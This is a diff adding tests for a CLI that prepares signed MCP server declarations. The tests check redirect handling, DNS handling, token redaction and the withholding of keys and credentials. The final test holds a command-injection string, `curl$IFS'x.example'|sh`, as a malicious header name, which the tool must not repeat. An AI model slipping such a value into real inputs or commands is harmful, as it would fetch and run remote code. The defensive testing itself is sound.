+    assert.match(r.stdout, /a remote that is a URL template cannot be declared in format addon-declaration\/0\.2: a declaration names the concrete URLs a client connects to/);
+    assert.match(r.stdout, /name that URL in "remotes" of the server\.json of 1\.0\.1 \(no \{\.\.\.\} and no "variables"\) and give that file with --server-json <server\.json>/);
+    assert.ok(!/fix the remote in the server\.json/.test(r.stdout), 'the general advice is not repeated');
+  });
+  // --no-pointer: the listed version keeps its template.
+  await scenario({ registry: baseRegistry({ [regPath()]: { body: tpl } }), site: baseSite() }, [NAME, '--for-version', '1.0.0', '--no-pointer', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 29, r.stdout + r.stderr);
+    assert.match(r.stdout, /the listed version keeps its template remote, so no declaration can be made for it/);
+  });
+});
+
+test('resolve.js: the hardened fetch says why a host lookup failed and the status of an oversized body; hostWithoutAddress asks A and AAAA', async () => {
+  await assert.rejects(httpsRequest('https://nowhere.example/x', { lookupAll: async () => { throw Object.assign(new Error('x'), { code: 'ENOTFOUND' }); }, attempts: 1 }), (e) => e.hostLookupCode === 'ENOTFOUND' && /could not resolve host \(ENOTFOUND\)/.test(e.message));
+  const seen = [];
+  const st = await serve({ '/big': { status: 404, headers: { 'Content-Type': 'text/html' }, body: 'q'.repeat(5000) } }, seen);
+  try {
+    await assert.rejects(httpsRequest(`http://127.0.0.1:${st.port}/big`, { allowLoopbackHttp: true, maxBytes: 4096 }), (e) => e.tooLarge === true && e.status === 404);
+  } finally {
+    await st.close();
+  }
+  const err = (code) => async () => { throw Object.assign(new Error(code), { code }); };
+  const fake = (a, aaaa) => ({ resolve4: typeof a === 'function' ? a : async () => a, resolve6: typeof aaaa === 'function' ? aaaa : async () => aaaa });
+  assert.equal((await hostWithoutAddress('x.example', { resolver: fake(err('ENODATA'), err('ENODATA')) })).noAddress, true);
+  assert.equal((await hostWithoutAddress('x.example', { resolver: fake(err('ENOTFOUND'), err('ENOTFOUND')) })).noAddress, true);
+  assert.equal((await hostWithoutAddress('x.example', { resolver: fake(err('ENODATA'), err('ETIMEOUT')) })).noAddress, false);
+  assert.equal((await hostWithoutAddress('x.example', { resolver: fake(err('ESERVFAIL'), err('ENODATA')) })).noAddress, false);
+  assert.equal((await hostWithoutAddress('x.example', { resolver: fake(['203.0.113.7'], err('ENODATA')) })).noAddress, false);
+  assert.match((await hostWithoutAddress('x.example', { resolver: fake(err('ENODATA'), err('ETIMEOUT')) })).detail, /A query with ENODATA and the AAAA query with ETIMEOUT/);
+});
+
+// ---- review of the field study fixes (20 November 2026) ----
+
+test('review: a permanent redirect at latest.json into a declaration folder is not read as no previous declaration', async () => {
+  const byHashUrl = `https://${HOST}${folder}by-hash/${hex(d2)}.json`;
+  const big = 'r'.repeat(20000);
+  const cases = [
+    ['301 to a by-hash file', { status: 301, headers: { Location: byHashUrl }, body: '' }],
+    ['308 to itself', { status: 308, headers: { Location: 'latest.json' }, body: '' }],
+    ['301 to the folder on another host', { status: 301, headers: { Location: `https://www.example.com${folder.toUpperCase()}latest.json` }, body: '' }],
+    ['301 with a large body', { status: 301, headers: { Location: byHashUrl, 'Content-Type': 'text/html' }, body: big }],
+  ];
+  for (const [label, answer] of cases) {
+    await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: answer, [`${HOST}${folder}by-hash/${hex(d2)}.json`]: { body: text(d2) } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut(), '--json'], (r) => {
+      assert.equal(r.code, 35, `${label}: ${r.stdout}${r.stderr}`);
+      assert.equal(r.json.state, 'previous_unreadable');
+      assert.ok(r.json.reasons.some((x) => /which is inside a declaration folder, so a declaration may be served behind it/.test(x)), label);
+      assert.ok(r.json.reasons.some((x) => /serve latest\.json itself with HTTP status 200 and no redirect/.test(x)), label);
+      assert.ok(!NO_DASH.test(r.json.reasons.join(' ').replace(/--[a-z]/g, '')));
+    });
+  }
+  // A redirect out of the declaration folders is still read as no previous declaration.
+  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: { status: 301, headers: { Location: 'https://www.example.com/' }, body: '' } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut(), '--json'], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+    assert.equal(r.json.previous.result, 'redirect');
+  });
+});
+
+test('review: before a redirect, a large body or a host with no address is read as no previous declaration, the registry list of versions is read', async () => {
+  // The newest version (1.0.1) was published without the pointer 1.0.0 carries.
+  const dropped = {
+    [regPath()]: { body: listingFor({ version: '1.0.1' }) },
+    [versionsPath()]: versionsList(listingFor({ pointerTo: d2, isLatest: false }), listingFor({ version: '1.0.1' })),
+  };
+  const enotfound = (u) => (u.hostname === HOST && u.pathname.endsWith('latest.json') ? async () => { throw Object.assign(new Error('getaddrinfo ENOTFOUND'), { code: 'ENOTFOUND' }); } : undefined);
+  const noAddress = { hostWithoutAddress: async () => ({ noAddress: true, detail: 'the name servers answered the A query with ENOTFOUND and the AAAA query with ENOTFOUND' }) };
+  const cases = [
+    ['301 out of the folder', { site: baseSite({ [latestPath]: { status: 301, headers: { Location: 'https://www.example.com/' }, body: '' } }) }],
+    ['200 over 16384 bytes', { site: baseSite({ [latestPath]: { status: 200, headers: { 'Content-Type': 'text/html' }, body: '<html>' + 'w'.repeat(20000) } }) }],
+    ['host with no address', { site: baseSite(), lookupFor: enotfound, extraDeps: noAddress }],
+  ];
+  for (const [label, opts] of cases) {
+    const out = freshOut();
+    await scenario({ registry: dropped, ...opts }, [NAME, '--for-version', '1.0.2', '--tools', TOOLS_FILE, '--out', out, '--json'], (r, w) => {
+      assert.equal(r.code, 36, `${label}: ${r.stdout}${r.stderr}`);
+      assert.equal(r.json.state, 'previous_not_linkable');
+      assert.equal(r.json.declaration, null);
+      assert.ok(r.json.reasons.some((x) => /but version 1\.0\.0 of com\.example\/weather names one \(https:\/\/example\.com\/.*by-hash\/.*\): a history of declarations exists, and the newest version was published without its pointer/.test(x)), `${label}: ${r.json.reasons.join('\n')}`);
+      assert.ok(r.json.reasons.some((x) => /give --no-previous to start a new history on purpose/.test(x)));
+      assert.ok(w.seen.some((s) => s.path === versionsPath()), 'the list of versions was read');
+    });
+    assert.deepEqual(filesUnder(out), [], `${label}: nothing written`);
+  }
+  // A list of versions that cannot be read in full, or does not fit the listing, stops the run too.
+  const unreadable = [
+    ['not served', null, /the registry answered HTTP 404/],
+    ['more pages', { body: { servers: [listingFor()], metadata: { count: 1, nextCursor: 'p2' } } }, /the list has more than one page/],
+    ['another name', versionsList(listingFor({ name: 'com.example/other' })), /an entry of the list is not a listing of com\.example\/weather/],
+    ['no listed version', versionsList(listingFor({ version: '0.9.0' })), /the list does not hold the listed version 1\.0\.0/],
+    ['not JSON', { headers: { 'Content-Type': 'text/html' }, body: '<html>' }, /not strict JSON/],
+  ];
+  for (const [label, route, why] of unreadable) {
+    const registry = { [regPath()]: { body: listingFor() }, ...(route ? { [versionsPath()]: route } : {}) };
+    await scenario({ registry, site: baseSite({ [latestPath]: { status: 308, headers: { Location: 'https://www.example.com/' }, body: '' } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
+      assert.equal(r.code, 35, `${label}: ${r.stdout}${r.stderr}`);
+      assert.match(r.stdout, why, label);
+      assert.match(r.stdout, /give --no-previous to make this the first one/, label);
+    });
+  }
+  // A plain 404 at latest.json does not read the list (as before).
+  await scenario({ registry: { [regPath()]: { body: listingFor() } }, site: baseSite() }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r, w) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+    assert.ok(!w.seen.some((s) => s.path === versionsPath()));
+  });
+});
+
+test('review: a declaration for this name at latest.json that fails its checks stops the run when the listing names none', async () => {
+  // Issued later than --now (clock skew): not_yet_valid.
+  const later = signDeclaration({ ...JSON.parse(text(d2)), signature: undefined, issuedAt: '2026-11-20T11:00:00Z' }, k.loaded);
+  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: { body: text(later) } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut(), '--json'], (r) => {
+    assert.equal(r.code, 36, r.stdout + r.stderr);
+    assert.equal(r.json.previous.result, 'not_yet_valid');
+    assert.ok(r.json.reasons.some((x) => /holds a declaration for com\.example\/weather, sha256:[0-9a-f]{64}, that cannot be linked as previous: it was issued at 2026-11-20T11:00:00Z/.test(x)), r.json.reasons.join('\n'));
+    assert.ok(!r.json.notes.some((n) => /makes the first declaration/.test(n)), 'no note calls it the first declaration');
+  });
+  // A changed member (the signature no longer matches): invalid_signature.
+  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: { body: text({ ...d2, contact: 'mailto:x@example.com' }) } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut(), '--json'], (r) => {
+    assert.equal(r.code, 36, r.stdout + r.stderr);
+    assert.equal(r.json.previous.result, 'invalid_signature');
+  });
+  // A declaration for another server is not one for this name: a first declaration, as before.
+  const other = signDeclaration({ ...JSON.parse(text(d2)), signature: undefined, name: 'com.example/other' }, k.loaded);
+  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: { body: text(other) } }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut(), '--json'], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+    assert.equal(r.json.previous.result, 'invalid');
+  });
+});
+
+test('review: NEXT_STEPS.txt names a redirect or a host with no address; a plain 404 gets the note; a body cut short stops the run', async () => {
+  const out = freshOut();
+  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: { status: 301, headers: { Location: 'https://www.example.com/' }, body: '' } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+  }, { env: ENV });
+  let next = fs.readFileSync(path.join(out, 'NEXT_STEPS.txt'), 'utf8');
+  assert.match(next, /When prepare ran, https:\/\/example\.com\/\.well-known\/addon-declaration\/com\.example\/weather\/latest\.json answered with a permanent redirect\. check-listing follows no redirect, and a browser follows one without showing it/);
+  assert.match(next, /such as curl -sI https:\/\/example\.com\/\.well-known\/addon-declaration\/com\.example\/weather\/by-hash\/[0-9a-f]{64}\.json: the first line must show status 200/);
+  assert.match(next, /check-listing reports declaration_unreachable/);
+  assert.ok(!NO_DASH.test(next.replace(/--?[a-zA-Z]/g, '')), 'no dash punctuation');
+  assert.ok(!/\b(never|guaranteed|safe|secure|trusted)\b/i.test(next));
+  // A host with no address.
+  const out2 = freshOut();
+  const enotfound = (u) => (u.hostname === HOST && u.pathname.endsWith('latest.json') ? async () => { throw Object.assign(new Error('getaddrinfo ENOTFOUND'), { code: 'ENOTFOUND' }); } : undefined);
+  await scenario({ registry: baseRegistry(), site: baseSite(), lookupFor: enotfound, extraDeps: { hostWithoutAddress: async () => ({ noAddress: true, detail: 'x' }) } }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out2], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+  }, { env: ENV });
+  next = fs.readFileSync(path.join(out2, 'NEXT_STEPS.txt'), 'utf8');
+  assert.match(next, /When prepare ran, example\.com had no address in DNS\. Give it an address and serve these files there before the next step/);
+  // A plain 404 (no redirect): no such line in NEXT_STEPS.txt, and the note says what was seen.
+  const out3 = freshOut();
+  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out3, '--json'], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+    assert.ok(r.json.notes.some((n) => n === `https://${HOST}${folder}latest.json answered HTTP 404. The listing of 1.0.0 names no declaration, so this run makes the first declaration for this server. The files this run writes for upload are to be served in https://${HOST}${folder}, each with HTTP status 200 and no redirect. If you served a declaration at that address before, do not use the files of this run: serve that declaration there again and run prepare again, so the new one follows it`), r.json.notes.join('\n'));
+  }, { env: ENV });
+  assert.ok(!/When prepare ran/.test(fs.readFileSync(path.join(out3, 'NEXT_STEPS.txt'), 'utf8')));
+  // A close delimited 200 answer cut short in the middle of a declaration.
+  const cut = (req) => req.socket.end('HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: application/json\r\n\r\n' + text(d2).slice(0, 200));
+  await scenario({ registry: baseRegistry(), site: baseSite({ [latestPath]: cut }) }, [NAME, '--for-version', '1.0.1', '--tools', TOOLS_FILE, '--out', freshOut()], (r) => {
+    assert.equal(r.code, 35, r.stdout + r.stderr);
+    assert.match(r.stdout, /answered HTTP 200 with a body that begins as a declaration but does not parse/);
+  });
+});
+
+test('review: a token typed in place of the variable name is not repeated', async () => {
+  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', `Authorization=${TOKEN}`, '--out', freshOut()], (r, w) => {
+    assert.equal(r.code, 1, r.stdout + r.stderr);
+    assert.ok(!r.stderr.includes(TOKEN) && !r.stdout.includes(TOKEN), r.stderr);
+    assert.match(r.stderr, /the environment variable given after "=" \(what was given is not repeated\) is not set/);
+    assert.equal(w.seen.length, 0);
+  }, { env: {} });
+  // A variable whose name is not in the usual upper case form: not repeated in the note either.
+  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp(BEARER) }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=lower_case_name', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+    assert.ok(!r.stdout.includes('lower_case_name'));
+    assert.match(r.stdout, /the value from the variable given for Authorization, not shown/);
+  }, { env: { lower_case_name: BEARER } });
+});
+
+test('review: a credential the server repeats is hidden also when the message is cut short', async () => {
+  const jwt = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.' + crypto.randomBytes(160).toString('base64url') + '.' + crypto.randomBytes(60).toString('base64url');
+  assert.ok(jwt.length > 280);
+  const echo = (req, res, body) => {
+    const m = JSON.parse(body);
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ jsonrpc: '2.0', id: m.id, error: { code: -32001, message: 'invalid token ' + req.headers.authorization } }));
+  };
+  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: echo }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=TOK', '--json', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 30, r.stdout + r.stderr);
+    for (let i = 0; i + 16 <= jwt.length; i++) assert.ok(!r.stdout.includes(jwt.slice(i, i + 16)), `a part of the token at ${i} reached the output`);
+    assert.match(r.json.tools.error, /JSON-RPC error -32001 \(invalid token <header value hidden>\)/);
+  }, { env: { TOK: `Bearer ${jwt}` } });
+  // The client hides before it cuts: a redact function sees the whole message.
+  const request = async (url, opts) => {
+    const b = JSON.parse(opts.body);
+    return { status: 200, headers: { 'content-type': 'application/json' }, body: Buffer.from(JSON.stringify({ jsonrpc: '2.0', id: b.id, error: { code: -32001, message: 'x'.repeat(150) + jwt } })) };
+  };
+  await assert.rejects(fetchToolsList(REMOTE, { request, headers: { Authorization: `Bearer ${jwt}` }, redact: (s) => s.split(jwt).join('<hidden>') }), (e) => e.message.includes('<hidden>') && !e.message.includes(jwt.slice(0, 20)));
+});
+
+test('review: the header goes to a host outside the namespace, or with another registry, only when --tools-header-host names it', async () => {
+  const outside = listingFor({ remotes: [{ type: 'streamable-http', url: 'https://collector.example.net/mcp' }] });
+  const got = [];
+  const collector = (req, res, body) => (got.push(req.headers.authorization), mcpServer()(req, res, body));
+  const site = baseSite({ 'POST collector.example.net/mcp': collector });
+  await scenario({ registry: baseRegistry({ [regPath()]: { body: outside } }), site }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=T', '--out', freshOut()], (r, w) => {
+    assert.equal(r.code, 30, r.stdout + r.stderr);
+    assert.match(r.stdout, /collector\.example\.net is not example\.com \(the domain the namespace names\) or a host under it/);
+    assert.match(r.stdout, /run prepare again with --tools-header-host collector\.example\.net as well/);
+    assert.ok(!w.seen.some((s) => s.headers.authorization !== undefined), 'nothing carried the header');
+  }, { env: { T: 'Bearer secret-token-123456' } });
+  assert.deepEqual(got, []);
+  // Named: sent.
+  await scenario({ registry: baseRegistry({ [regPath()]: { body: outside } }), site }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=T', '--tools-header-host', 'collector.example.net', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+  }, { env: { T: 'Bearer secret-token-123456' } });
+  assert.deepEqual(got, ['Bearer secret-token-123456']);
+  // A subdomain of the namespace domain needs no option.
+  const sub = listingFor({ remotes: [{ type: 'streamable-http', url: 'https://mcp.example.com/mcp' }] });
+  await scenario({ registry: baseRegistry({ [regPath()]: { body: sub } }), site: baseSite({ 'POST mcp.example.com/mcp': guardedMcp(BEARER) }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=T', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+  }, { env: { T: BEARER } });
+  // A registry that is not the official one (here https, served by the site double): the host must be named.
+  const regRoutes = { [`registry.example.org${regPath()}`]: { body: listingFor() }, [`registry.example.org${versionsPath()}`]: versionsList(listingFor()) };
+  const seenAuth = [];
+  await scenario({ registry: {}, site: baseSite({ ...regRoutes, [`POST ${HOST}/mcp`]: guardedMcp(BEARER, { seen: seenAuth }) }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=T', '--registry', 'https://registry.example.org', '--now', NOW, '--out', freshOut()], (r) => {
+    assert.equal(r.code, 30, r.stdout + r.stderr);
+    assert.match(r.stdout, /the listing was read from https:\/\/registry\.example\.org, not from the official registry/);
+  }, { env: { T: BEARER }, registryArg: false });
+  assert.deepEqual(seenAuth, []);
+  await scenario({ registry: {}, site: baseSite({ ...regRoutes, [`POST ${HOST}/mcp`]: guardedMcp(BEARER, { seen: seenAuth }) }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=T', '--tools-header-host', 'example.com', '--registry', 'https://registry.example.org', '--now', NOW, '--out', freshOut()], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+  }, { env: { T: BEARER }, registryArg: false });
+  assert.deepEqual(seenAuth, [BEARER]);
+  // The 401 advice names the option for such a host.
+  await scenario({ registry: baseRegistry({ [regPath()]: { body: outside } }), site: baseSite({ 'POST collector.example.net/mcp': mcpServer('auth') }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 30, r.stdout + r.stderr);
+    assert.match(r.stdout, /also give --tools-header-host collector\.example\.net once you have checked that it is your server/);
+  });
+  // Bad --tools-header-host: refused, not repeated.
+  for (const [args, why] of [[['--tools-header-host', 'example.com'], /given only with --tools-header-env/], [['--tools-header-env', 'Authorization=T', '--tools-header-host', TOKEN.toUpperCase()], /takes the lowercase host name/]]) {
+    await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--dry-run', ...args, '--out', freshOut()], (r, w) => {
+      assert.equal(r.code, 1, r.stdout + r.stderr);
+      assert.match(r.stderr, why);
+      assert.ok(!r.stderr.includes(TOKEN.toUpperCase()));
+      assert.equal(w.seen.length, 0);
+    }, { env: { T: BEARER } });
+  }
+});
+
+test('review: the private signing key is not sent as a header', async () => {
+  const keyFile = path.join(tmp, 'review-key.hex');
+  fs.writeFileSync(keyFile, k.hex + '\n');
+  const pemOneLine = k.pem.replace(/\s*\n\s*/g, ' ').trim();
+  const cases = [
+    [['--key-env', 'K', '--tools-header-env', 'X-API-KEY=K'], { K: k.hex }, /is the one --key-env names, which holds your private key/],
+    [['--key-env', 'K', '--tools-header-env', 'X-API-KEY=H'], { K: k.hex, H: k.hex }, /holds private key material/],
+    [['--key-env', 'K', '--dry-run', '--tools-header-env', 'Authorization=H'], { K: k.hex, H: `Bearer ${k.hex.toUpperCase()}` }, /holds private key material/],
+    [['--key-file', keyFile, '--tools-header-env', 'X-API-KEY=H'], { H: k.hex }, /holds private key material/],
+    [['--tools-header-env', 'X-API-KEY=H'], { H: pemOneLine }, /holds private key material/],
+  ];
+  for (const [args, env, why] of cases) {
+    await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', ...args, '--out', freshOut()], (r, w) => {
+      assert.equal(r.code, 1, `${args.join(' ')}: ${r.stdout}${r.stderr}`);
+      assert.match(r.stderr, why, args.join(' '));
+      assertNoSecrets(r.stdout, r.stderr);
+      assert.ok(!r.stderr.toLowerCase().includes(k.hex.toLowerCase()));
+      assert.equal(w.seen.length, 0, 'no request');
+    }, { env });
+  }
+  // A 64 hex API token that is not the key is accepted.
+  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp(k2.hex, { headerName: 'x-api-key' }) }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'K', '--tools-header-env', 'X-API-KEY=H', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+  }, { env: { K: k.hex, H: k2.hex } });
+});
+
+test('review: a short header value is not hidden in the output, and the output is not rewritten', async () => {
+  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp('example', { headerName: 'x-tenant' }) }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'X-Tenant=T', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 0, r.stdout + r.stderr);
+    assert.ok(!r.stdout.includes('<header value hidden>'), r.stdout);
+    assert.match(r.stdout, /read com\.example\/weather 1\.0\.0/);
+    assert.match(r.stdout, /https:\/\/example\.com\/mcp/);
+    assert.match(r.stdout, /the value of X-Tenant has fewer than 8 characters, so it is read as a setting, not a secret/);
+  }, { env: { T: 'example' } });
+  // A longer value is hidden in server text only: the rest of the output keeps its words.
+  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: guardedMcp('Bearer other', { echo: true }) }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--tools-header-env', 'Authorization=T', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 30, r.stdout + r.stderr);
+    assert.match(r.stdout, /bad credential <header value hidden>/);
+    assert.match(r.stdout, /read com\.example\/weather 1\.0\.0/);
+  }, { env: { T: 'Bearer examplecorp' } });
+});
+
+test('review: a declared header name a shell would read is not suggested', async () => {
+  const evil = '`curl$IFS' + "'x.example'" + '|sh`';
+  const listing = listingFor({ remotes: [{ type: 'streamable-http', url: REMOTE, headers: [{ name: evil }] }] });
+  await scenario({ registry: baseRegistry({ [regPath()]: { body: listing } }), site: baseSite({ [`POST ${HOST}/mcp`]: mcpServer('auth') }) }, [NAME, '--for-version', '1.0.1', '--dry-run', '--out', freshOut()], (r) => {
+    assert.equal(r.code, 30, r.stdout + r.stderr);
+    assert.ok(!r.stdout.includes('curl$IFS'), r.stdout);
+    assert.match(r.stdout, /--tools-header-env "Authorization=MCP_TOOLS_AUTH"/);
+  });
 });
